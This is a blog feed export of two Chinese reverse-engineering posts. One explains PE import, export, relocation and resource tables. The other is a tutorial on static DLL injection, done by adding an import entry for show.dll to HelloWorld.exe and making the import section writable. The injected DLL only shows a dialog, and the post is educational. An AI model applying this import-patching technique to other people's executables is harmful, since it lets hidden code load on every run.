title="输入函数的调用"></a>输入函数的调用</h3><p>输入函数就是被程序调用但其执行代码不在程序中的函数，这些函数的代码位于相关的DLL中，在调用者程序中只保留相关的函数信息，例如函数名、DLL文件名等。对磁盘上的PE文件来说，它无法得知这些输入函数在内存中的地址。只有当PE文件载入内存后，Windows加载器才将相关DLL载入，并将调用输入函数的指令和函数实际所处的地址联系起来。</p><ul><li>隐式调用:当应用程序调用一个DLL的代码和数据时，程序就被隐式地连接到DLL，这个过程是由Windows加载器完成地。</li><li>显示调用:首先需要确定目标DLL已被加载，然后寻找API地地址，是通过LoadLibrary和GetProcAddress完成的。</li></ul><p>PE文件内有一组数据结构，分别对应于被输入的DLL。每一个这样的结构都给出了被输入的DLL的名称并指向一组函数指针。这组函数指针被称为输入地址表(Import Address Table,IAT)。每一个被引入的API在IAT里都保留位置，在IAT里API可以被Windows加载器写入输入函数的地址</p><h3 id="输入表结构"><a href="#输入表结构" class="headerlink" title="输入表结构"></a>输入表结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">IMAGE_IMPORT_DESCRIPTOR STRUCT<br><span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class"><span class="hljs-title">characteristics</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">OriginalFirstThunk</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">ends</span></span><br><span class="hljs-class"><span class="hljs-title">TimeDateStamp</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">ForwarderChain</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">Name</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">FirstThunk</span><span class="hljs-title">DWORD</span></span><br><span class="hljs-class"><span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> <span class="hljs-title">ENDS</span></span><br></code></pre></td></tr></table></figure><ul><li>OriginalFirstThunk(Characteritics):包含指向输入名称表(INT)的RVA。INT是一个IMAGE_THUNK_DATA结构的数组，数组中的每个IMAGE_THUNK_DATA结构都指向IMAGE_IMPORT_BY_NAME结构，数组以一个内容为0的IMAGE_THUNK_DATA结构结束。</li><li>TimeDateStamp:一个32位的时间标志</li><li>ForwarderChain:这是第一个被转向的API的索引，一般为0，在程序引入一个DLL中的API，而这个API又在引用其他DLL的API时使用。</li><li>Name:DLL名字的指针。是以\x00结尾的ASCII字符的RVA地址，该字符串包含输入的DLL名。</li><li>FirstThunk:包含指向输入地址表(IAT)的RVA。IAT是一个IMAGE_THUNK_DATA结构的数组</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610528559472.png" alt="1610528559472"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">IMAGE_THUNK_DATASTRUCT<br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">u1</span></span><br><span class="hljs-class"><span class="hljs-title">ForwarderString</span><span class="hljs-title">DWORD</span> ;</span>指向一个转向者字符串的RVA<br>FunctionDWORD ;被输入的函数的内存地址<br>OridinalDWORD ;被输入的API的序数值<br>AddressOfDataDWORD ;指向IMAGE_IMPORT_BY_NAME<br>ends<br>IMAGE_THUNK_DATA_ENDS<br></code></pre></td></tr></table></figure><p><strong>当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时低31位被看成一个函数序号。当双字最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA，指向一个IMAGE_IMPORT_BY_NAME结构</strong></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">IMAGE_IMPORT_BY_NAME <span class="hljs-keyword">STRUCT</span><br><span class="hljs-type">Hint</span>WORD<br>NameBYTE<br>IMAGE_IMPORT_BY_NAME ENDS<br></code></pre></td></tr></table></figure><ul><li>Hint:本函数在其所驻留DLL的输入表中的序号。该域被PE装载器用来在DLL的输入表里快速查询函数。该值不是必需的，一些链接器将它设为0.</li><li>Name:含有输入函数的函数名。函数名是一个ASCII字符串，以”NULL”结尾。</li></ul><h3 id="输入表地址"><a href="#输入表地址" class="headerlink" title="输入表地址"></a>输入表地址</h3><p><strong>为什么会有两个并行的指针数组指向IMAGE_IMPORT_BY_NAME结构</strong></p><ul><li>第一个数组OriginalFirstThunk所指向的数组，为单独的一项，不可改写，称为INT。也称提示名表</li><li>第二个数组有FirstThunk所指向的数组，由PE装载器重写的。</li><li>PE装载器先搜索OriginalFirst结构所指向的输入函数的地址。然后，加载器用函数真正的入口地址来代替由FirstThunk指向的IMAGE_THUNK_DATA数组里元素的值。<code>Jmp dword ptr [xxxxx]</code>语句中的<code>[xxxxx]</code>是指FirstThunk数组的一个入口，因此被称为输入地址表(IAT Import Address Table)。此时输入表的其他部分就不太重要了，程序依靠IAT提供的函数地址就可以正常运行。程序依靠IAT提供的函数地址就可以正常运行。</li></ul><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610531246311.png" alt="1610531246311"></p><ul><li>另一种情况是程序OrignalFirstThunk的值为0。初始化时，系统根据FirstThunk的值找到指向函数名的地址串，根据地址串找到函数名，再根据函数名得到入口地址，然后用入口地址取代FirstThunk指向的地址串中的原值。</li></ul><h3 id="输入表实例分析"><a href="#输入表实例分析" class="headerlink" title="输入表实例分析"></a>输入表实例分析</h3><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610713812828.png" alt="1610713812828"></p><table><thead><tr><th>OrignalFirstThunk</th><th>TimeDateStamp</th><th>ForwardChain</th><th>Name</th><th>First Thunk</th></tr></thead><tbody><tr><td>8C20 0000</td><td>0000 0000</td><td>0000 0000</td><td>7421 0000</td><td>1020 0000</td></tr><tr><td>7C20 0000</td><td>0000 0000</td><td>0000 0000</td><td>B421 0000</td><td>0020 0000</td></tr><tr><td>0000 0000</td><td>0000 0000</td><td>0000 0000</td><td>0000 0000</td><td>0000 0000</td></tr></tbody></table><p>每个IID中的第4个字段是指向DLL名称的指针。OrignalFirstThunk中指向的是IMAGE_THUNK_DATA数组，它存储的是指向IMAGE_IMPORT_BY_NAME结构</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610714378003.png" alt="1610714378003"></p><p><strong>IMAGE_THUNK_DATA数据</strong></p><table><thead><tr><th>1021 0000</th><th>1c21 0000</th><th>f420 0000</th><th>e020 0000</th></tr></thead><tbody><tr><td>5021 0000</td><td>6421 0000</td><td>0221 0000</td><td>ce20 0000</td></tr><tr><td>bc20 0000</td><td>2e21 0000</td><td>4221 0000</td><td>0000 000</td></tr></tbody></table><p>同一IID结构中FirstThunk的字段值为2010h,即文件偏移为610h<img src="https://github.com/h0pe-ay/picgo/raw/master/1610721193755.png" alt="1610721193755"></p><p>其数据与PrignalFirstThunk字段所指的完全一样。</p><p>name字段所指向的不是刚好ASCII字符串，前面还有2个字节的空缺，这是作为函数名(Hint)引用的，可以为0.</p><p><strong>API函数</strong></p><table><thead><tr><th>提示名表(RVA)</th><th>提示名表(File Offset)</th><th>Hint</th><th>ApiName</th></tr></thead><tbody><tr><td>00002110h</td><td>710h</td><td>019bh</td><td>LoadIconA</td></tr><tr><td>0000211ch</td><td>71ch</td><td>01DDH</td><td>PostQuitMessage</td></tr><tr><td>000020f4h</td><td>6f4h</td><td>0128h</td><td>GetMessageA</td></tr><tr><td>000020e0h</td><td>6e0h</td><td>0094h</td><td>DispatchMessageA</td></tr><tr><td>00002150h</td><td>750h</td><td>072dh</td><td>TranslateMessage</td></tr><tr><td>00002164h</td><td>764h</td><td>028bh</td><td>UpdateWindow</td></tr><tr><td>00002102h</td><td>702h</td><td>0197h</td><td>LoadCursorA</td></tr><tr><td>000020ceh</td><td>6ceh</td><td>0083h</td><td>DefWindowProcA</td></tr><tr><td>000020bch</td><td>72eh</td><td>01efh</td><td>RegisterClassExA</td></tr><tr><td>00002142h</td><td>742h</td><td>0265h</td><td>ShowWindow</td></tr></tbody></table><h3 id="绑定输入"><a href="#绑定输入" class="headerlink" title="绑定输入"></a>绑定输入</h3><p>当PE装载器载入PE文件时，会检查输入表并将相关的DLL映射到进程地址空间，然后遍历IAT里的IMAGE_THUNK_DATA数组并用输入函数的真实地址替换它。如果程序员能正确预测函数地址，PE装载器就不用再每次载入PE文件时都去修改IMAGE_THUNK_DATA的值。</p><p>当一个可执行文件被绑定时，IAT中的IMAGE_THUNK_DATA结构被输入函数的实际地址改写了。在磁盘中可执行文件的IAT里，有的存放的是与DLL输出函数相关的实际内存地址。</p><p>在整个进程执行期间，Bind程序做了如下两个重要假设</p><ul><li>当进程初始化时，需要的DLL实际上加载到了它们的首选基地址中。</li><li>自从绑定操作执行依赖，DLL输出表中引用的符号位置一直没有改变。</li></ul><p><strong>IMAGE_BOUND_IMPORT_DESCRIPTOR</strong></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">IMAGE_BOUND_IMPORT_DESCRIPTOR STRUCT<br>TimeDateStamp<span class="hljs-built_in">DWORD</span><br>offsetModuleName<span class="hljs-built_in">WORD</span><br>NumberOfModuleForwarderRefs<span class="hljs-built_in">WORD</span><br>IMAGE_BOUND_IMPORT_DESCRIPTOR ENDS<br></code></pre></td></tr></table></figure><ul><li>TimeDateStamp:一个汉字，包含一个被输入DLL的时间&#x2F;日期戳。它允许加载器快速判断是否是新的。</li><li>OffsetModuleName:一个字，包含一个被输入DLL的名称的偏移。这个字段是与第一个IBID结构之间的偏移(不是RVA)</li><li>NumberOfModuleForwarderRes:一个字，包含紧跟该结构的IMAGE_BOUND_FORWARDER_REF结构的数目。</li></ul><h2 id="输出表"><a href="#输出表" class="headerlink" title="输出表"></a>输出表</h2><p>当一个DLL函数能被EXE或另一个DLL文件使用时，它就被输出。输出信息保存在输出表中，DLL文件通过输出表向系统提供输出函数名、序列号和入口地址等。</p><h3 id="输出表结构"><a href="#输出表结构" class="headerlink" title="输出表结构"></a>输出表结构</h3><p>输出表的主要内容是一个表格，其中包括函数名称、输出序数。序数是指定DLL中某个函数的16位数字，在做指向的DLL独一无二。</p><p>输出表是数据目录表的第1个成员，指向IMAGE_EXPORT_DIRECTORY(IED)结构。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">IMAGE_EXPORT_DIRECTORY STRUCT<br>CharacteristicsDWORD <span class="hljs-comment">;未使用，总是为0</span><br>TimeDateStampDWORD <span class="hljs-comment">;文件生成时间</span><br>MajorVersionWORD <span class="hljs-comment">;主版本号，一般为0</span><br>MinorVersionWORD <span class="hljs-comment">;次版本号，一般为0</span><br>NameDWORD <span class="hljs-comment">;模块的真实名称</span><br><span class="hljs-keyword">Base</span>DWORD <span class="hljs-comment">;基数,序数减这个基数就是函数地址数组的索引值</span><br>NumberOfFunctions DWORD <span class="hljs-comment">;AddressOfFunctions阵列中的元素个数</span><br>NumberOfNames  DWORD <span class="hljs-comment">;AddressOfName阵列中的元素个数</span><br><span class="hljs-keyword">AddressOfFunctions</span>DWORD <span class="hljs-comment">;指向函数地址数组</span><br><span class="hljs-keyword">AddressOfNames</span>DWORD <span class="hljs-comment">;函数名字的指针地址</span><br><span class="hljs-keyword">AddressOfNameOrdinals</span>DWORD <span class="hljs-comment">;指向输出序列号数组</span><br></code></pre></td></tr></table></figure><ul><li>Characteristics:输出属性的旗标。目前还没有定义，总是为0</li><li>TimeDateStamp:输出表创建的时间(GMT时间)</li><li>MajorVersion:输出表的主版本号。未使用，设置为0</li><li>MinorVersion:输出表的次版本号。未使用，设置为0</li><li>Name:指向一个ASCII字符串的RVA。这个字符串是与这些输出函数相关联的DLL的名字</li><li>Base:这个字段包含用于这个PE文件输出表的起始数值(基数)。正常情况下这个数值为1.当通过序数查询一个输出函数时，这个值从序数里被减去，其结果将作为进入输出地址表(EAT)的索引</li><li>NumberOfFunctions:EAT中的条目数量。当条目为0时，这个序数值表名没有代码或数据被输出</li><li>NumberOfNames:输出函数名称表(ENT)里的条目数量。NumberOfNames的值总是小于或等于NumberOfFunctions的值，小于的情况发生在符号只通过序数输出的时候。另外，当被赋值的序数里有数字间距时也会是小于的情况，这个值也是输出序数表的长度。</li><li>AddressOfFunctions:EAT的RVA。EAT是一个RVA数组，数组中的每一个非零的RVA都对应于一个被输出的符号。</li><li>AddressOfNames:ENT的RVA。ENT是一个指向ASCII字符串的RVA数组。每一个ASCII字符串对应于一个通过名字输出的符号。因为这个表是要排序的，所以ASCII字符串也是按顺序排序的。</li><li>AddressOfNameOrdinals:输出序数表的RVA。这个表是字的数组。这个表将ENT中的数组索引映射到相应的输出地址表条目。</li><li><img src="https://github.com/h0pe-ay/picgo/raw/master/1610812538170.png" alt="1610812538170"></li></ul><h2 id="基址重定位"><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h2><p>在PE文件中，重定位表往往单独作为一块，用<code>.reloc</code>表示</p><h3 id="基址重定位的概念"><a href="#基址重定位的概念" class="headerlink" title="基址重定位的概念"></a>基址重定位的概念</h3><p>PE格式不参考外部DLL或模块中的其他区块，而是把文件中所有可能需要修改的地址放在一个数组里。如果PE文件不在首选的地址载入，那么文件中的每一个定位都需要被修改。</p><h3 id="基址重定位表的结构"><a href="#基址重定位表的结构" class="headerlink" title="基址重定位表的结构"></a>基址重定位表的结构</h3><p>基址重定位表位于一个.reloc区块内，找到它们得正确方式是通过数据目录表得IMAGE_DIRECTORY_ENTRY_BASERELOC条目查找。基址重定位数据采用类似按页分割的方法组织，是由许多重定位块串接成的，每个块中存放4KB(1000h)的重定位信息，每个重定位数据块的大小必须以DWORD(4字节)对齐。以IMAGE_BASE_RELOCATION结构开始</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IMAGE_BASE_RELOCATION STRUCT<br>VirtualAddressDWORD<span class="hljs-comment">;重定位数据的开始RVA地址</span><br>SizeOfBlockDWORD<span class="hljs-comment">;重定位块的长度</span><br>TypeOffsetDWORD<span class="hljs-comment">;重定位项数组</span><br>IMAGE_BASE_RELOCATION ENDS<br></code></pre></td></tr></table></figure><ul><li>VirtualAddress:这组重定位数据的开始RVA地址。各重定位项的地址加这个值才是该重定位项的完整RVA地址</li><li>SizeOfBlock:当前重定位结构的大小。因为VirtualAddress和SizeOfBlock的大小都是固定的4字节，所以这个值减8就是TypeOffset数组的大小。</li><li>TypeOffset:一个数组。数组每项大小为2字节，共16位。这16位分为高4位和低12位。高4位代表重定位类型;低12位是重定位地址，它与VirtualAddress相加就是指向PE映像中需要修改的地址数据的指针。</li></ul><table><thead><tr><th>类型</th><th>winnt.h里的预定义值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_REL_BASED_ABSOLUTE</td><td>没有具体的含义，只是为了让每个段4字节对齐</td></tr><tr><td>3h</td><td>IMAGE_REL_BASED_HIGHLOW</td><td>重定位指向的整个地址都需要修改</td></tr><tr><td>10h</td><td>IMAGE_REL_BASED_DIR4</td><td>出现在64位PE文件中，对指向的整个地址进行修正</td></tr></tbody></table><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610868096785.png" alt="1610868096785"></p><p><strong>重定位数据转换</strong></p><table><thead><tr><th>项目</th><th>重定位数据1</th><th>重定位数据2</th><th>重定位数据3</th><th>重定位数据4</th></tr></thead><tbody><tr><td>原始数据</td><td>0F30h</td><td>2330h</td><td>0000</td><td>0000</td></tr><tr><td>TypeOffset值</td><td>300Fh</td><td>3023h</td><td>-</td><td>-</td></tr><tr><td>TypeOffset高4位(类型)</td><td>3h</td><td>3h</td><td>-</td><td>-</td></tr><tr><td>TypeOffset低12位(地址)</td><td>00fh</td><td>023h</td><td>-</td><td>-</td></tr><tr><td>低12位加VirtualAddress</td><td>100fh(RVA)</td><td>1023h(RVA)</td><td>-</td><td>-</td></tr><tr><td>转换成文件偏移地址</td><td>60fh</td><td>623h</td><td>-</td><td>-</td></tr></tbody></table><p>60fh和623h分别指向00402000h和00403030h处</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/1610868439050.png" alt="1610868439050"></p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Windows程序的各种界面称为资源，包括加速键、位图、光标、对话框、图标、菜单、串表、工具栏和版本信息等。</p><h3 id="资源结构"><a href="#资源结构" class="headerlink" title="资源结构"></a>资源结构</h3><p>资源使用类型于磁盘目录结构的方式保存，目录通常包含三层。</p><ul><li>第一层类似于文件系统的根目录，每个根目录下的条目总是在它自己权限下的一个目录。</li><li>第二层目录中的每一个都对应于一个资源类型。</li><li>每个第2层资源类型目录下是第3层目录</li></ul><p><strong>资源目录结构</strong></p><ul><li>IMAGE_DIRECTORY_ENTRY_RESOURCE条目包含资源的RVA和大小</li><li>IMAGE_RESOURCE_DIRECTORY和数个IMAGE_RESOURCE_DIRECTORY_ENTRY组成资源目录结构</li></ul><p><strong>IMAGE_RESOURCE_DIRECTORY</strong>结构长度为16字节</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IMAGE_RESOURCE_DIRECTORY STRUCT<br>CharacteristicsDWORD<span class="hljs-comment">;理论上是资源的属性标志，通常为0</span><br>TimeDateStampDWORD<span class="hljs-comment">;资源建立时间</span><br>MajorVersionWORD<span class="hljs-comment">;理论上是放置资源的版本，通常为0</span><br>MinorVersionWORD<span class="hljs-comment">;</span><br>NumberOfNamedEntriesWORD<span class="hljs-comment">;使用名字的资源条目的个数</span><br>NumberOfEntriesWORD<span class="hljs-comment">;使用ID数字资源条目的个数</span><br></code></pre></td></tr></table></figure><p><strong>资源目录入口结构</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">IMAGE_RESOURCE_DIRECTORY_ENTRYSTRUCT<br>NameDWORD<span class="hljs-comment">;目录项的名称字符串指针或ID</span><br>offsetToDateDWORD<span class="hljs-comment">;资源数据偏移地址或子目录偏移地址</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PE静态文件注入</title>
    <link href="/2023/06/07/PE%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/06/07/PE%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p><strong>本文首发于合天智汇</strong></p><h1 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h1><p><code>DLL</code>注入指的是向运行中的其他进程强制插入特定的<code>DLL</code>文件。</p><p>可以通过修改静态的<code>PE</code>文件，修改输入表结构，使得程序执行时载入特定的<code>DLL</code>文件。</p><p>通常可执行文件需要使用其他<code>DLL</code>文件中的代码或数据，这些<code>DLL</code>文件相关的信息会保存在输入表中，因此我们通过修改<code>PE</code>文件中输入表相应的信息，即可实现<code>PE</code>文件在运行时自动载入特定的<code>DLL</code>文件。</p><p>使用<code>PEview</code>工具可以清晰的看到程序说输入表的信息</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128175512800.png" alt="image-20220128175512800"></p><h2 id="输入表"><a href="#输入表" class="headerlink" title="输入表"></a>输入表</h2><p>由于需要修改输入表信息，因此这里简单介绍一下输入表的结构。</p><p>在<code>PE</code>文件的可选头中存在这数据目录项， 里面记载了输出表、输入表等关键信息的偏移及大小。那么理所当然的<code>PE</code>文件在执行时也会通过数据目录项里的信息去找寻输入表。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128175922148.png" alt="image-20220128175922148"></p><p>输入表是由<code>IMAGE_IMPORT_DESCRIPTOR</code>结构的数组组成，简称<code>IID</code>,没有特定的成员指出<code>IID</code>项数，但是会由全为0的<code>IID</code>结构作为结束。</p><p>上图可以看出输入表的起始地址为<code>0x1B1C4</code>，这是<code>RVA</code>(相对偏移地址)地址，我们需要转化为文件的偏移地址才能够在文件中找到相应的内容。工具中提供了<code>RVA</code>与文件偏移地址的转换或者自行计算。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128181051920.png" alt="image-20220128181051920"></p><p>从上图可以看出<code>IID</code>结构确实是由全为0的<code>IID</code>结构作为结束。</p><p><strong>输入表结构</strong></p><p><code>IID</code>结构的字段成员如下，其中<code>OriginalFirstThunk</code>、<code>Name</code>以及<code>FirstThunk</code>成员是我们添加<code>DLL</code>文件的关键。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++">IMAGE_IMPORT_DESCRIPTOR<br><span class="hljs-keyword">union</span><br><span class="hljs-title class_">characteristics</span>DWORD<br>OriginalFirstThunkDWORD <span class="hljs-comment">//指向IMAGE_THUNK_DATA结构的数组</span><br>ends<br>TimeDateStampDWORD <span class="hljs-comment">//时间标志</span><br>ForwarderChainDWORD <span class="hljs-comment">//一般为0</span><br>NameDWORD <span class="hljs-comment">//指向DLL名称的指针</span><br>FirstThunkDWORD<span class="hljs-comment">//指向IMAGE_THUNK_DATA结构的数组</span><br>IMAGE_IMPORT_DESCRIPTOR<br></code></pre></td></tr></table></figure><p>在<code>PE</code>文件尚未执行过时，<code>OriginalFirstThunk</code>与<code>FirstThunk</code>字段指向相同的结构，区别在于<code>OriginalFirstThunk</code>不可以重写，而<code>FirstThunk</code>可以被重写，当<code>PE</code>文件执行后<code>FirstThunk</code>指向的结构会用于存放输入函数的真实地址。因此我们修改时将<code>OriginalFirstThunk</code>与<code>FirstThunk</code>字段指向同个地址即可。而<code>Name</code>字段存放的是指向<code>DLL</code>文件名称的指针。</p><table><thead><tr><th align="left">OriginalFirstThunk</th><th>FirstThunk</th><th>Name</th></tr></thead><tbody><tr><td align="left">指向IMAGE_THUNK_DATA结构的数组</td><td>指向IMAGE_THUNK_DATA结构的数组</td><td>指向DLL名称的指针</td></tr></tbody></table><p><strong>IMAGE_THUNK_DATA</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">IMAGE_THUNK_DATA<br><span class="hljs-keyword">union</span> <span class="hljs-title class_">u1</span><br>ForwarderStringDWORD <span class="hljs-comment">//指向一个转向者字符串的RVA</span><br>FunctionDWORD <span class="hljs-comment">//被输入的函数的内存地址</span><br>OridinalDWORD <span class="hljs-comment">//被输入的API的序数值</span><br>AddressOfDataDWORD <span class="hljs-comment">//指向IMAGE_IMPORT_BY_NAME</span><br>IMAGE_THUNK_DATA<br></code></pre></td></tr></table></figure><p><code>IMAGE_THUNK_DATA</code>结构在不同情况下的成员不同，但是重点关注<code>AddresOfData</code>字段，该字段指向<code>IMAGE_IMPORT_BY_NAME</code>结构，该结构记录的输入函数的名称。当<code>IMAGE_THUNK_DATA</code>值的双字的最高位为0时，表示函数以字符串类型的函数名方式输入。因此构造时高两个字节为0，低两个字节为<code>IMAGE_IMPORT_BY_NAME</code>结构地址即可。</p><p><strong>IMAGE_IMPORT_BY_NAME</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++">IMAGE_IMPORT_BY_NAME STRUCT<br>HintWORD <span class="hljs-comment">//忽略设置为0</span><br>NameBYTE <span class="hljs-comment">//输入函数名称</span><br>IMAGE_IMPORT_BY_NAME<br></code></pre></td></tr></table></figure><p><code>IMAGE_IMPORT_BY_NAME</code>结构的高两字节的值忽略，后门跟着的数据直接填入<code>DLL</code>文件中输出的函数名称，即<code>PE</code>文件运行时会使用到<code>DLL</code>文件中函数的名称。</p><h2 id="修改PE文件"><a href="#修改PE文件" class="headerlink" title="修改PE文件"></a>修改PE文件</h2><p>这里准备两个文件</p><ul><li>文件一：<code>HelloWorld.exe</code>，该文件仅仅是简单在屏幕输出<code>HelloWorld!!!</code>的字符</li><li>文件二：待注入的<code>DLL</code>文件，<code>show.dll</code>，该<code>DLL</code>文件的功能可以根据实际情况而定，这里我准备的<code>DLL</code>文件可以简单的弹出一个对话框。</li></ul><p>将<code>HelloWorld.exe</code>文件拖入<code>PEview</code>工具中，查看输入表内容。可以看到并没有载入<code>show.dll</code>文件。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128183520961.png" alt="image-20220128183520961"></p><p>运行<code>HelloWorld.exe</code>文件</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128183807221.png" alt="image-20220128183807221"></p><p>开始修改<code>HelloWorld.exe</code>文件的思路</p><ul><li>需要在输入表中添加额外的<code>IID</code>结构，该<code>IID</code>成员的信息为<code>show.dll</code>文件的信息</li><li>由于需要添加<code>IID</code>成员，需要观察原始输入表是否由额外的空间可以容纳新的<code>IID</code>结构，若没有则可以选择<ul><li>文件中的空白区域</li><li>文件末尾添加新节区</li></ul></li></ul><p>现在观察<code>HelloWorld.exe</code>文件的输入表，可以看见在输入表的结尾处紧跟着的是一串数据，并且大概率不是无用的数据，若我们直接在输入表结尾处添加新的<code>IID</code>结构必定会破坏原文件的结构，导致程序无法正常运行。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128184307687.png" alt="image-20220128184307687"></p><p>因此选择在找空白处，因为<code>PE</code>文件需要对齐，因此会使用大量的空字符进行填充。空白区域可以任取，但是需要记住选取的地址因为后续需要用到。并且我们需要观察该空白区域是否会被载入到内存中去。我们这里选择的是<code>idata</code>段末尾位置，因此需要去查询<code>idata</code>段信息。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128184520992.png" alt="image-20220128184520992"></p><p>如下图所示，文件中<code>idata</code>段的大小比映射到内存中的大小更大，因此我们可以利用这段差值填充伪造输入表。这里选择文件偏移<code>0x8960</code>作为输入表的起始地址。不能将<code>0x8950</code>作为其实地址，这样<code>KERNEL32.DLL</code>字符串会缺失截断符，运行时会提示找不到该<code>DLL</code>文件。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128184910174.png" alt="image-20220128184910174"></p><p>首先将原输入表的数据复制下来，写入文件偏移<code>0x8960</code>处，新增一个<code>IID</code>结构，<code>Name</code>字段填入<code>DLL</code>文件的名字，即<code>show.dll</code>，而<code>OriginalFirstThunk</code>与<code>FirstThunk</code>字段填入填入<code>IMAGE_IMPORT_BY_NAME</code>结构体的地址，<code>IMAGE_IMPORT_BY_NAME</code>的内容填入输入函数的名称，并且高两个字节需要为0。这里所有填入的地址都为<code>RVA</code>地址，因此需要将文件地址转化为<code>RVA</code>地址填入。<img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128205506926.png" alt="image-20220128205506926"></p><p>接着需要改写<code>idata</code>的权限，前面说到<code>FirstThunk</code>在PE文件运行后是会被改写的，因此输入表所在的区段需要具有写权限。可以看到<code>idata</code>不具备写权限，因此需要将写权限加上。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128202057265.png" alt="image-20220128202057265"></p><p><code>0x80000000</code>为写权限的标志位，因此将原来的数据或上<code>0x80000000</code>即可</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128202247026.png" alt="image-20220128202247026"></p><p>修改后为<code>0xC0000000</code></p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128202332919.png" alt="image-20220128202332919"></p><p>最后由于修改了输入表结构以及所在地址并且新增了一个<code>IID</code>结构因此需要去数据目录项的位置修改输入表的地址及大小。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128205744922.png" alt="image-20220128205744922"></p><p>使用<code>PEView</code>工具查看修改后的文件，能够发现修改后的文件使用工具依然能够识别出来，证明没有把文件修坏。</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128205844499.png" alt="image-20220128205844499"></p><p>最后执行程序，发现<code>show.dll</code>文件成功注入</p><p><img src="https://github.com/h0pe-ay/picgo/raw/master/image-20220128205052410.png" alt="image-20220128205052410"></p><h1 id="参考文章"><a href="#参考文章" 